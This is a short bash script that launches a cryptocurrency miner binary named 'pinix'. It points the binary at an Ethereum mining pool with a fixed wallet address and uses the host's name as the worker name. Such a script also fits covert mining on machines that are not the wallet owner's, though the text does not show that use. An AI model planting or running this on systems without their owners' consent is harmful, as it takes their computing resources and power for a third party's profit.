#!/bin/bash

POOL=eth.2miners.com:2020
WALLET=0xf7273ad5d0e81c6395ba1aa880c57fb99de9414a
WORKER=$(echo "$(cat /proc/sys/kernel/hostname)" | tr . _ )-TQC

cd "$(dirname "$0")"

chmod +x ./pinix && ./pinix -wal $WALLET.$WORKER -epool $POOL -pass x -stales 0 $@
